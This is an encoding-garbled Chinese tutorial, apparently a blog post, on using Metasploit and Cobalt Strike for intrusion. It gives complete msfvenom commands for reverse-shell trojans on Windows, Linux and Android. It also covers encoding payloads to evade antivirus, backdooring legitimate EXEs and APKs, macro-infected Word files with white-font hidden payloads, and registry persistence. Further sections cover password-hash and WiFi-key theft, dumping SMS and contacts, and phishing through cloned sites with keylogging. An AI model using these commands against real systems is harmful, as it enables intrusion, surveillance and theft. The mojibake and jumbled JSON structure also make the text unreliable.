post/multi/gather/wlan_geolocateï¼šåŸºäºwlanè¿›è¡Œåœ°ç†ä½ç½®ç¡®è®¤ï¼Œæœ€ç»ˆlootæ–‡ä»¶å¤¹åœ¨/root/.msf4/lootï¼Œå¦‚æœé€šè¿‡è¯¥æ¨¡å—è·å¾—äº†åœ°ç†ä¿¡æ¯ï¼Œä¼šåœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆtxtæ–‡ä»¶ã€‚æ³¨æ„ä¸‹è·¯å¾„é‡ç‚¹msf4ï¼Œä¿ä¸å‡†æ˜å¤©å°±å˜æˆmsf5äº†ï¼Œæ˜¯éšè—æ–‡ä»¶ï¼Œçœ‹æ–‡ä»¶å¤¹è®°å¾—å‹¾éšè—æ–‡ä»¶ï¼Œå‘½ä»¤è¡ŒæŸ¥çœ‹è®°å¾—åŠ -a run hashdumpï¼šè·å–ç›®æ ‡ç³»ç»Ÿç”¨æˆ·å¯†ç hashï¼Œè¯¥è„šæœ¬éœ€è¦ç³»ç»Ÿç”¨æˆ·systemæƒé™ run service_managerï¼šç›®æ ‡ç³»ç»ŸæœåŠ¡ç®¡ç†ï¼Œå®ƒè¿˜æœ‰å±äºè‡ªå·±çš„å‚æ•°ï¼Œä¸€èˆ¬ç”¨äºä¿¡æ¯æ”¶é›†å¸¸ä¼šç”¨åˆ°-lå‚æ•° run post/windows/wlan/wlan_profileï¼šç”¨äºè¯»å–ç›®æ ‡ä¸»æœºWiFiå¯†ç  run sound_recorderï¼šå£°éŸ³è®°å½• run webcamï¼šå¼€å¯æ‘„åƒå¤´ æƒé™ç»´æŒ-ç”ŸæˆæŒç»­æ€§åé—¨ å› ä¸º meterpreter æ˜¯åŸºäºå†…å­˜DLLå»ºç«‹çš„è¿æ¥ï¼Œæ‰€ä»¥ï¼Œåªè¦ç›®æ ‡ä¸»æœºå…³æœºï¼Œæˆ‘ä»¬çš„è¿æ¥å°±ä¼šæ–­ã€‚æˆ‘ä»¬åˆä¸èƒ½æ¯æ¬¡æƒ³è¿æ¥çš„æ—¶å€™ï¼Œæ¯æ¬¡éƒ½å»æ”»å‡»ï¼Œç„¶åå†åˆ©ç”¨ meterpreter å»ºç«‹è¿æ¥ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¾—åœ¨ç›®æ ‡ä¸»æœºç³»ç»Ÿå†…ç•™ä¸‹ä¸€ä¸ªæŒç»­æ€§çš„åé—¨ï¼Œåªè¦ç›®æ ‡ä¸»æœºå¼€æœºäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿æ¥åˆ°è¯¥ä¸»æœº\nPersistenceåé—¨-å†™å…¥æ³¨å†Œè¡¨ å¯ä»¥å†msfconsoleä¸­ä½¿ç”¨exploit/windows/local/persistenceæ¨¡å—ï¼š\nè®¾ç½®session è®¾ç½®startupï¼ˆå°½é‡é€‰é«˜æƒé™å¦‚systemï¼‰ run æœ‰ç‚¹å°éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥åœ¨meterpreterä¸­åˆ›å»ºpersistenceåé—¨ï¼š\nrun persistence -S -U -X -i 5 -p 8888 -r 192.168.111.132 å…¶ä¸­persistenceçš„é€‰é¡¹å¦‚ä¸‹ï¼š\n-A è‡ªåŠ¨å¯åŠ¨ä¸€ä¸ªåŒ¹é…çš„æ¼æ´/å¤š/å¤„ç†ç¨‹åºæ¥è¿æ¥åˆ°ä»£ç† -Lå¦‚æœä¸ä½¿ç”¨%TEMP%ï¼Œåˆ™é€‰æ‹©ç›®æ ‡ä¸»æœºä¸­å†™å…¥æœ‰æ•ˆè´Ÿè½½çš„\u0026gt;ä½ç½®ã€‚ -P æœ‰æ•ˆè½½è·ä½¿ç”¨ï¼Œé»˜è®¤æ˜¯windows/meterpreter/reverse_tcpã€‚ -Såœ¨å¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ä»£ç†ä½œä¸ºæœåŠ¡(å…·æœ‰ç³»ç»Ÿç‰¹æƒ) -T é€‰æ‹©è¦ä½¿ç”¨çš„å¯æ‰§è¡Œæ¨¡æ¿ -Uç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨ä»£ç† -Xåœ¨ç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨å¯åŠ¨ä»£ç† -hè¿™ä¸ªå¸®åŠ©èœå• -iæ¯æ¬¡è¿æ¥å°è¯•ä¹‹é—´çš„é—´éš”(ä»¥ç§’ä¸ºå•ä½) -p è¿è¡ŒMetasploitçš„ç³»ç»Ÿæ­£åœ¨ç›‘å¬çš„ç«¯å£ -r è¿è¡ŒMetasploitçš„ç³»ç»Ÿçš„IPç›‘å¬è¿æ¥è¿”å› å†™å…¥ä¹‹åç”¨multi/handleræ¨¡å—è®¾ç½®ç›‘å¬å³å¯\nå…­ã€å®¢æˆ·ç«¯æ¸—é€ï¼ˆé’“é±¼ï¼‰ å®¢æˆ·ç«¯æ¸—é€åŸç† åœ¨æˆ‘ä»¬åœ¨æ— æ³•çªç ´å¯¹æ–¹çš„ç½‘ç»œè¾¹ç•Œçš„æ—¶å€™ï¼Œå¾€å¾€éœ€è¦ä½¿ç”¨å®¢æˆ·ç«¯æ¸—é€è¿™ç§æ–¹å¼å¯¹ç›®æ ‡å‘èµ·æ”»å‡»ï¼Œæ¯”å¦‚æˆ‘ä»¬å‘ç›®æ ‡å‘ä¸€ä¸ªå«æœ‰åé—¨çš„ç¨‹åºï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªwordæ–‡æ¡£ã€pdfæ–‡ä»¶ã€‚\nå®¢æˆ·ç«¯æ¸—é€æŠ€å·§ï¼Œé€šå¸¸ç”¨æˆ·çš„è®¡ç®—æœºéƒ½å®‰è£…äº†å®‰å…¨è½¯ä»¶ï¼Œä¸€èˆ¬æˆ‘ä»¬ç”Ÿæˆçš„æ¶æ„ç¨‹åºéƒ½ä¼šè¢«æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰€è®¾è®¡çš„æ¶æ„è½¯ä»¶å¯ä»¥åˆ©ç”¨äººçš„åŠ£æ ¹æ€§ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†æ¶æ„è½¯ä»¶æˆ–ç½‘ç«™ä¼ªè£…æˆHè‰²è½¯ä»¶æˆ–ç½‘ç«™ï¼Œè¿™æ ·ç›®æ ‡ä¼šè®¤ä¸ºä»–æœ¬èº«å°±æ˜¯ä¸å¥½çš„è½¯ä»¶è¢«å®‰å…¨è½¯ä»¶æ£€æµ‹æ˜¯å¾ˆæ­£å¸¸çš„äº‹æƒ…ï¼Œå¦‚æœä»–å®‰è€ä¸ä½å…³é—­å®‰å…¨é˜²æŠ¤è½¯ä»¶æ‰§æ„è¦è¿è¡Œæ¶æ„ç¨‹åºï¼Œé‚£ä¹ˆä»–å°±ä¸­æ‹›äº†\nåˆ¶ä½œWindowsæ¶æ„è½¯ä»¶ åŸºç¡€ msfvenomæ˜¯msfpayload,msfencodeçš„ç»“åˆä½“ï¼Œå¯åˆ©ç”¨msfvenomç”Ÿæˆæœ¨é©¬ç¨‹åº,å¹¶åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œï¼Œåœ¨æœ¬åœ°ç›‘å¬ä¸Šçº¿ï¼š\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b \u0026#34;\\x00\u0026#34; -e x86/shikata_ga_nai -i 10 -f exe - o /var/www/html/vip.exe # è¿™é‡Œæ˜¯msf5ï¼Œå¦‚æœæ˜¯msf6åº”è¯¥ä¸ºwindows/meterpreter_reverse_tcp ç®€å•åˆ†æä¸€ä¸‹é€‰é¡¹ï¼š\n-a windowsä½æ•° \u0026ndash;platform æ“ä½œç³»ç»Ÿ -p payload -b å»é™¤åå­—ç¬¦ \\x00 -e æŒ‡å®šç¼–ç å™¨ï¼ˆæœ¬æ„ç”¨äºå…æ€ï¼Œä½†æ•ˆæœä¸å¤ªè¡Œäº†ï¼‰ -i ç¼–ç æ¬¡æ•° -f ç”Ÿæˆç¨‹åºç±»å‹ -o ç”Ÿæˆä½ç½® å¯ä»¥å°è¯•ä¸¤ç§ç¼–ç å‡å°‘æ€è½¯è¯†åˆ«ç‡ï¼š\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b \u0026#34;\\x00\u0026#34; -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f exe - o /var/www/html/vip.exe ç»™åº”ç”¨è½¯ä»¶åŠ ä¸Šåé—¨ é¿å…å½±å“åŸç¨‹åºè¿è¡Œï¼Œå¯ä»¥ä¸ç»™ä¸»ç¨‹åºä¸Šåé—¨ï¼Œå°†é©¬å­ç»‘å®šåˆ°å…³è”è¿è¡Œçš„ç¨‹åºå³å¯\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b\u0026#34;\\x00\u0026#34; -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe -x ä»¥æŸç¨‹åºä¸ºæ¨¡æ¿ åˆ¶ä½œLinuxæ¶æ„è½¯ä»¶ åŒç†ï¼Œæ¢äº†ä¸ªå¹³å°è€Œå·²ï¼š\nmsfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.111.132 LPORT=7890 -f elf \u0026gt; mshell.elf åˆ©ç”¨å®æ„ŸæŸ“wordæ–‡æ¡£ å‰ææ˜¯ç”¨æˆ·çš„officeå¼€å¯äº†å®\nç”Ÿæˆå®å’Œpayloadï¼š\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.60.128 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe å°†ç”Ÿæˆçš„å®ä»£ç ç²˜è´´åˆ°wordçš„å®é‡Œé¢ï¼Œä¿å­˜ä¸ºå¯ç”¨å®çš„æ–‡æ¡£\nå°†ç”Ÿæˆçš„payloadæ”¾åˆ°æ–‡æ¡£å†…å®¹ä¸­ï¼Œå­—ä½“è°ƒæˆç™½è‰²è¿›è¡Œéšè—\nä¸ƒã€MSFæ³¨å…¥Android MSFç”ŸæˆAndroid apk msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 R \u0026gt; /var/www/html/msf.apk åŒæ ·multi/handlerç›‘å¬\n520_APK_HOOK æˆ‘ä»¬ç»™å·²æœ‰åº”ç”¨è½¯ä»¶åŠ åé—¨ï¼ˆåº”ç”¨apkå¯ä»¥åœ¨è±Œè±†èšä¸Šä¸‹è½½ï¼‰ï¼š\nmsfvenom -x åº”ç”¨.apk --platform android -p android/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -o msftest.apk è¿™é‡Œé€šå¸¸ä¼šæŠ¥é”™è¯´apktoolè¿‡æ—§ï¼Œé‡æ–°é…ç½®åˆç•¥æ˜¾éº»çƒ¦ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ä¸€æ¬¾å·¥å…·ï¼š520_APK_HOOK\nç›¸æ¯”äºæ™®é€šçš„å®‰å“è¿œæ§ï¼Œæ­¤ç‰ˆæœ¬appåœ¨è¿›è¡Œè¿œæ§æ—¶ï¼Œè¢«æ³¨å…¥çš„appå¯ä»¥æ­£å¸¸è¿è¡Œ\næ³¨å…¥åçš„appåœ¨å®‰è£…æ—¶ï¼Œæ‰‹æœºç®¡å®¶ä¸ä¼šæœ‰ä»»ä½•å®‰å…¨æç¤ºï¼Œæ™®é€šçš„è¿œæ§ç¨‹åºï¼Œå®‰è£…æ—¶æ‰‹æœºç®¡å®¶ä¼šæœ‰å®‰å…¨è­¦ç¤º\nç†è®ºä¸Šæ¥è¯´ï¼Œåªè¦è¿œæ§è½¯ä»¶ä½¿ç”¨çš„æ˜¯çº¯Javaæˆ–è€…Kotlinç¼–å†™ï¼Œå°±å¯ä»¥ä½¿ç”¨ï¼Œä¸ä¸€å®šå¿…é¡»æ˜¯msfç”Ÿæˆçš„apk\njava -jar a520ApkHook-1.0-jar-with-dependencies.jar -o ~/Downloads/æƒ³è¿›è¡Œæ³¨å…¥çš„App.apk ~/Downloads/msf.apk #msf.apkå°±æ˜¯msfç”Ÿæˆçš„åé—¨apkï¼Œæ³¨å…¥æˆåŠŸåä¼šç”Ÿæˆ520apkhook.apk æ›´å¤šä½¿ç”¨ç»†èŠ‚è§é¡¹ç›®åœ°å€: https://github.com/ba0gu0/520apkhook\nå¸¸ç”¨çš„AndroidæŒ‡ä»¤ getshellåä¸€äº›å¸¸ç”¨æŒ‡ä»¤ï¼š\ncheck_root æ£€æŸ¥è®¾å¤‡æ˜¯å¦ä¸ºroot\ndump_calllog è·å¾—é€šè¯è®°å½•\ndump_contacts è·å¾—é€šè®¯å½•\ndump_sms è·å¾—çŸ­ä¿¡\ngeolocate è·å–å®šä½ä¿¡æ¯\nsend_sms å‘é€ä¸€æ¡çŸ­ä¿¡\nwlan_geolocate é€šè¿‡wlanä¿¡æ¯è·å¾—å®šä½ä¿¡æ¯\napp_install å®‰è£…app\napp_list åˆ—å‡ºå½“å‰è®¾å¤‡ä¸Šå·²å®‰è£…çš„åŒ…å\napp_run é€šè¿‡åŒ…åå¯åŠ¨Androidåº”ç”¨\napp_uninstall å¸è½½ä¸€ä¸ªapp\nCoBalt Strikeï¼ˆCSï¼‰ CobaltStrikeæ˜¯ä¸€æ¬¾ç¾å›½RedTeamå¼€å‘çš„æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œå¸¸è¢«ä¸šç•Œäººç§°ä¸ºCSã€‚å®ƒæ˜¯ä¸€æ¬¾ä»¥Metasploitä¸ºåŸºç¡€çš„GUIçš„æ¡†æ¶å¼æ¸—é€å·¥å…·ï¼Œé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æã€è‡ªåŠ¨åŒ–æº¢å‡ºã€å¤šæ¨¡å¼ç«¯å£ç›‘å¬ã€Winexeæœ¨é©¬ç”Ÿæˆã€Windllæœ¨é©¬ç”Ÿæˆã€Javaæœ¨é©¬ç”Ÿæˆã€officeå®ç—…æ¯’ç”Ÿæˆã€æœ¨é©¬æ†ç»‘ç­‰ï¼›é’“é±¼æ”»å‡»åŒ…æ‹¬ï¼šç«™ç‚¹å…‹éš†ã€ç›®æ ‡ä¿¡æ¯è·å–ã€Javaæ‰§è¡Œã€æµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰\nå®˜æ–¹åœ°å€ï¼šhttps://www.cobaltstrike.com\nä¸€ã€CSä»‹ç» CobaltStrikeåˆ†ä¸ºæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯\næœåŠ¡ç«¯å¯ä»¥éƒ¨ç½²åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸‹æˆ–è€…éƒ¨ç½²åœ¨kailié‡Œ\nå®¢æˆ·ç«¯å¯ä»¥éƒ¨ç½²åˆ°æœ¬åœ°æ”¯æŒlinuxå’Œwindowsç³»ç»Ÿ\nCSçš„ä¸€å¤§ç‰¹è‰²æ˜¯æ”¯æŒå¤šäººè¿åŠ¨ğŸ¥µï¼Œé›†ä½“ä¸Šçº¿åˆ†å·¥åˆä½œï¼š\näºŒã€CSæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯ æœåŠ¡ç«¯å¯åŠ¨ æœåŠ¡ç«¯å°½é‡éƒ¨ç½²åœ¨linuxä¸­\næ‰“å¼€rootç»ˆç«¯è¿›å…¥CSç›®å½•\nåœ¨ç»ˆç«¯ä¸­è¾“å…¥ï¼š./teamserverIPå¯†ç \nå®¢æˆ·ç«¯è¿æ¥ Cobaltstrikeå®¢æˆ·ç«¯åœ¨Windowsã€Linuxã€Macä¸‹éƒ½å¯ä»¥è¿è¡Œ (éœ€è¦é…ç½®å¥½Javaç¯å¢ƒ)ã€‚\nå¯åŠ¨CobaltStrikeå®¢æˆ·ç«¯ï¼Œè¾“å…¥æœåŠ¡ç«¯çš„IPä»¥åŠç«¯å£ã€è¿æ¥å¯†ç ï¼Œç”¨æˆ·åå¯ä»¥ä»»æ„è®¾ç½®\nä¸‰ã€CSåŸºæœ¬åŠŸèƒ½ç®€ä»‹ ç•Œé¢çš„å›¾æ ‡ï¼š\nå…¶ä»–åŠŸèƒ½é€‰é¡¹çš„éƒ½æœ‰æ–‡å­—ï¼Œä¸åšèµ˜è¿°\nç›‘å¬å™¨ Cobaltstrikeæä¾›äº†å¤šç§ç›‘å¬å™¨\nbeacon_xxç³»åˆ—ä¸ºCobaltStrikeè‡ªèº«å†…ç½®çš„ç›‘å¬å™¨ï¼Œå³åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œç›¸åº”çš„payloadï¼Œè·å–shellåˆ°CSä¸Šï¼ŒåŒ…æ‹¬dnsã€httpã€httpsã€smbã€tcpç­‰æ–¹å¼çš„ç›‘å¬å™¨ï¼›\nforeignç³»åˆ—ä¸ºå¤–éƒ¨ç›‘å¬å™¨ï¼Œé€šå¸¸ä¸MSFè”åŠ¨ï¼Œä¾‹å¦‚è·å–meterpreteråˆ°MSFä¸Š\nbeaconå¸¸ç”¨å‘½ä»¤ å³é”®ä¸Šçº¿çš„ä¸»æœºï¼Œç‚¹å‡»interactè¿›å…¥beaconå‘½ä»¤è¡Œ\nè®°å¾—è°ƒæ•´ä¸€ä¸‹å¿ƒè·³é—´éš”ï¼š\nsleep 3 #æ‰“é¶æœºç›´æ¥sleep 0å³å¯ï¼Œå®æˆ˜ä¸å»ºè®®è¿‡å¿«ï¼Œæµé‡ä¼šå¼‚å¸¸ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š\nshell [ç³»ç»Ÿå‘½ä»¤] beaconè‡ªèº«å‘½ä»¤ï¼š\nå‘½ä»¤å¾ˆå¤šï¼Œå¯ä»¥ç”¨helpæŸ¥çœ‹è¯¦ç»†è§£é‡Šï¼Œå¾ˆå¤šå‘½ä»¤åŸºæœ¬éƒ½å¯ä»¥ä¾é å›¾å½¢åŒ–ç•Œé¢å®Œæˆ\nä¿¡æ¯æ”¶é›† åŠŸèƒ½ç‚¹ä½äºAttacks -\u0026gt; web Drive-by -\u0026gt; System Profiler\nåŸç†å°±æ˜¯æŒ‚äº†ä¸ªç³»ç»Ÿä»£ç†ï¼Œç„¶åæˆ‘ä»¬è®¿é—®ç›®æ ‡ç½‘ç«™ï¼ŒCSè¿›è¡Œè¢«åŠ¨æ‰«æï¼Œä¸ªäººè§‰å¾—ä¸å¦‚ç”¨å…¶ä»–ä¸“é—¨çš„æ¼æ‰«å™¨\nç½‘ç«™å…‹éš† è¿™æ˜¯ä¸€ä¸ªæŒºæœ‰è¶£çš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨äºç®€å•çš„ç¤¾å·¥ã€é’“é±¼\nåŠŸèƒ½ç‚¹ä½äºAttacks -\u0026gt; web Drive-by -\u0026gt; Clone Site\nä¼¼ä¹åªèƒ½å…‹éš†http\næ¯”å¦‚å…‹éš†ç™¾åº¦ï¼Œæˆ‘ä»¬å°±è¿™æ ·ï¼ˆè¿™é‡Œå¯ä»¥æŠŠæœ€ä¸‹é¢çš„é”®ç›˜è®°å½•å‹¾ä¸Šï¼‰ï¼š\nå¯ä»¥çœ‹è§ç›´æ¥å°±å…‹éš†äº†ï¼Œéå¸¸å®Œç¾ï¼š\næ¥ä¸‹æ¥å°†ipæ‹¿å»ç”Ÿæˆä¸€ä¸ªçŸ­é“¾æ¥ï¼Œå°±æ¯”è¾ƒå…·æœ‰è¿·æƒ‘æ€§äº†\nåœ¨æœç´¢æ¡†è¾“å…¥Yuy0ungï¼Œä¹Ÿèƒ½æˆåŠŸè®°å½•ï¼š\né’“é±¼é‚®ä»¶ åŠŸèƒ½ç‚¹ä½äºAttacks -\u0026gt; Spear Phish å¦‚å›¾ï¼šè¯¥æ¨¡å—æœ‰6ä¸ªéœ€è¦è‡ªå®šä¹‰çš„å†…å®¹ï¼š\nç›®æ ‡ æ¨¡æ¿ é™„ä»¶ åµŒå…¥URL é‚®ä»¶æœåŠ¡å™¨ é€€ä¿¡é€šçŸ¥é‚®ç®± MSF\u0026amp;CSè”åŠ¨ ä¸€ã€Cobalt Strikeä¼ é€’ä¼šè¯åˆ°MSF æˆ‘ä»¬å½“å‰ä½¿ç”¨CSè·å¾—äº†ä¸€ä¸ªè¿‡äº†uacçš„win7çš„shell\næ¥ä¸‹æ¥å°†ä¼šè¯æ´¾ç”Ÿåˆ°msfï¼š\né¦–å…ˆåœ¨CSä¸Šç”¨exploit/multi/handlerçš„windows/meterpreter/reverse_httpå¼€å¯ç›‘å¬:\næ¥ä¸‹æ¥åœ¨CSä¸Šæ–°å»ºä¸€ä¸ªpayloadä¸ºforeign HTTPçš„ç›‘å¬å™¨ï¼š\nè®¾ç½®å¥½IPå’Œç«¯å£å³å¯åˆ›å»ºï¼š\nå³é”®CSä¸Šçš„ä¸»æœºï¼Œç‚¹å‡»spawnï¼Œé€‰æ‹©æˆ‘ä»¬åˆ›å»ºçš„ç›‘å¬å™¨å³å¯æ´¾ç”Ÿä¼šè¯ï¼š\näºŒã€MSFä¼ é€’ä¼šè¯åˆ°Cobalt Strike æˆ‘ä»¬å½“å‰ä½¿ç”¨MSFæ‰“æ°¸æ’ä¹‹è“è·å¾—äº†ä¸€ä¸ªwin7çš„shellï¼š\næ¥ä¸‹æ¥æ´¾ç”Ÿä¼šè¯åˆ°CSï¼š\nCSåˆ›å»ºä¸€ä¸ªpayloadä¸ºBeacon HTTPçš„ç›‘å¬å™¨ï¼š\nbackgroundè¿”å›åˆ°consoleé€‰æ‹©æ¨¡å—å¹¶è®¾ç½®å‚æ•°ï¼š\nuse exploit/windows/local/payload_inject set payload windows/meterpreter/reverse_http set lhost 192.168.111.132 # CSæœåŠ¡ç«¯IP set lport 8888 # CSæœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£å· set DisablePayloadHandler True set PrependMigrate True set session 1 # ä¼šè¯id run æ‰§è¡Œä¹‹åå³å¯æ´¾ç”Ÿä¼šè¯è‡³CSï¼š\n",
        "summary": "MSF\u0026amp;CSä»‹ç»ä¸ä½¿ç”¨ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œè¯·å‹¿ç”¨äºè¿æ³•æ´»åŠ¨\nMetasploit Frameworkï¼ˆMSFï¼‰ Metasploitæ˜¯rubyè¯­è¨€å¼€å‘çš„ä¸€ä¸ªåŸºäºå‘½ä»¤è¡Œæ“ä½œçš„æ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾ï¼Œåˆ©ç”¨å’ŒéªŒè¯æ¼æ´ï¼Œé™„å¸¦æ•°åƒä¸ªå·²çŸ¥çš„è½¯ä»¶æ¼æ´ï¼Œå¹¶ä¿æŒæŒç»­æ›´æ–°ã€‚Metasploitå¯ä»¥ç”¨æ¥ä¿¡æ¯æ”¶é›†ã€æ¼æ´æ¢æµ‹ã€æ¼æ´åˆ©ç”¨ç­‰æ¸—é€æµ‹è¯•çš„å…¨æµç¨‹\nä¸€ã€msfä½“ç³»æ¡†æ¶ msfçš„æ•´ä½“æ¡†æ¶å¦‚ä¸‹ï¼š\næˆ‘ä»¬é‡ç‚¹å…³æ³¨æ¨¡å—éƒ¨åˆ†\næ¨¡å—ç»„ç»‡æŒ‰ç…§ä¸åŒçš„ç”¨é€”åˆ†ä¸º7ç§ç±»å‹çš„æ¨¡å—ï¼ˆModulesï¼‰ï¼š\nè¾…åŠ©æ¨¡å—ï¼ˆAux)ï¼šè´Ÿè´£ä¿¡æ¯æ”¶é›†ã€æ‰«æã€å—…æ¢ã€æŒ‡çº¹è¯†åˆ«ã€å£ä»¤çŒœæµ‹å’ŒDosæ”»å‡»ç­‰åŠŸèƒ½ æ¸—é€æ”»å‡»æ¨¡å—ï¼ˆExploits)ï¼šåˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»ï¼Œé‡Œé¢æœ‰æ¯ä¸€ä¸ªå…·ä½“æ¼æ´çš„æ”»å‡»æ–¹æ³• åæ¸—é€æ”»å‡»æ¨¡å—ï¼ˆPost)ï¼šåœ¨å–å¾—ç›®æ ‡ç³»ç»Ÿè¿œç¨‹æ§åˆ¶æƒé™åï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„åæ¸—é€æ”»å‡»åŠ¨ä½œï¼Œå¦‚è·å–æ•æ„Ÿä¿¡æ¯ã€è·³æ¿æ”»å‡»ç­‰æ“ä½œ æ”»å‡»è½½è·æ¨¡å—ï¼ˆpayloads)ï¼šæˆåŠŸexploitä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤ ç¼–ç å™¨æ¨¡å—ï¼ˆEncoders)ï¼šä¸»è¦å¯¹payloadè¿›è¡ŒåŠ å¯†ï¼Œæœ€ç»ˆè¾¾åˆ°èº²é¿AntiVirusæ£€æŸ¥çš„ç›®çš„ ç©ºæŒ‡ä»¤æ¨¡å—ï¼ˆNops)ï¼šä¸»è¦ä½œç”¨æ˜¯æé«˜payloadç¨³å®šæ€§åŠç»´æŒå¤§å° å…æ€æ¨¡å—(Evasion)ï¼šå¯ä»¥ç”¨æ¥åˆ›å»ºæœ¨é©¬æ–‡ä»¶ äºŒã€MetasploitåŸºæœ¬ä½¿ç”¨ kaliä¸­è‡ªå¸¦äº†msfï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨\nMetasploitå¯åŠ¨ msfæœ‰ä¸€ä¸ªç”¨äºå­˜å‚¨ä¿¡æ¯æ”¶é›†æ•°æ®çš„å…³ç³»å‹æ•°æ®åº“Postgresqlï¼Œå¯ä»¥è‡ªä¸»é€‰æ‹©æ˜¯å¦å¼€å¯\nmsfæœ‰ä¸‰ç§å¯åŠ¨æ–¹å¼ï¼š\nå…ˆå¯åŠ¨Postgresqlæ•°æ®åº“ï¼Œå†å¯åŠ¨Metasploit\nservice postgresql start msfconsole ä¸å¯åŠ¨æ•°æ®åº“ï¼Œç›´æ¥å¯åŠ¨Metasploit\nmsfconsole å¯åŠ¨Postgresqlçš„åŒæ—¶å¯åŠ¨Metasploit\nmsfdb run ä¹Ÿå¯ä»¥ç›´æ¥åœ¨kaliå·¦ä¸Šè§’å·¥å…·ç‚¹å‡»å¯åŠ¨ï¼Œå®é™…ä¸Šæ˜¯è‡ªåŠ¨æ‰§è¡Œäº†å‘½ä»¤ï¼š\nsudo msfdb init \u0026amp;\u0026amp; msfconsole ç”±äºPostgresqlæ•°æ®åº“çš„é»˜è®¤ç«¯å£ä¸º5432ï¼Œæ‰€ä»¥å¯ä»¥æŸ¥çœ‹è¯¥ç«¯å£æ¥åˆ¤æ–­æ˜¯å¦å¼€å¯Postgresqlæ•°æ®åº“ï¼š\nnetstat -pantu | grep 5432 Metasploitå¸¸ç”¨å‘½ä»¤ åœ¨msfconsoleä¸­ï¼Œè¾“å…¥helpå¯ä»¥çœ‹è§å„ç§å‘½ä»¤çš„ä»‹ç»\nshowå±•ç¤º ç”¨äºå±•ç¤ºå¯ç”¨æ¨¡å—ï¼Œæœ‰æ•ˆå‚æ•°æ˜¯ï¼šallï¼Œencodersï¼Œnopsï¼Œexploitsï¼Œpayloadsï¼Œauxiliary, postï¼Œpluginsï¼Œinfoï¼Œoptions\nå±•ç¤ºæ¨¡å—æ—¶ï¼Œæ¯ä¸ªæ¨¡å—éƒ½ä¼šæœ‰ä¸€ä¸ªåä¸ºRankçš„å­—æ®µï¼Œè¯¥åˆ—ä»£è¡¨è¯¥æ¨¡å—çš„å¯é æ€§\nRank çš„å€¼å¯ä»¥æ˜¯ä¸‹é¢çš„è¡¨æ ¼ä¸­çš„å…¶ä¸­ä¹‹ä¸€ï¼ŒæŒ‰ç…§å¯é æ€§é™åºæ’åˆ—\nRanking Description ExcellentRanking æ¼æ´åˆ©ç”¨ç¨‹åºç»å¯¹ä¸ä¼šä½¿ç›®æ ‡æœåŠ¡å´©æºƒï¼Œå°±åƒ SQL æ³¨å…¥ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«ç­‰ç­‰ã€‚é™¤éæœ‰ç‰¹æ®Šæƒ…å†µï¼Œå…¸å‹çš„å†…å­˜ç ´ååˆ©ç”¨ç¨‹åºä¸å¯ä»¥è¢«è¯„ä¼°ä¸ºè¯¥çº§åˆ«ã€‚ï¼ˆWMF Escape()ï¼‰ GreatRanking è¯¥æ¼æ´åˆ©ç”¨ç¨‹åºæœ‰ä¸€ä¸ªé»˜è®¤çš„ç›®æ ‡ç³»ç»Ÿï¼Œå¹¶ä¸”å¯ä»¥è‡ªåŠ¨æ£€æµ‹é€‚å½“çš„ç›®æ ‡ç³»ç»Ÿï¼Œæˆ–è€…åœ¨ç›®æ ‡æœåŠ¡çš„ç‰ˆæœ¬æ£€æŸ¥ä¹‹åå¯ä»¥è¿”å›åˆ°ä¸€ä¸ªç‰¹å®šäºåº”ç”¨çš„è¿”å›åœ°å€ã€‚ï¼ˆè¯‘è€…æ³¨ï¼šæœ‰äº›äºŒè¿›åˆ¶çš„æ¼æ´åˆ©ç”¨æˆåŠŸåï¼Œéœ€è¦ç‰¹åˆ«è®¾ç½® Shell é€€å‡ºåçš„è¿”å›åœ°å€ï¼Œå¦åˆ™å½“ Shell ç»“æŸåï¼Œç›®æ 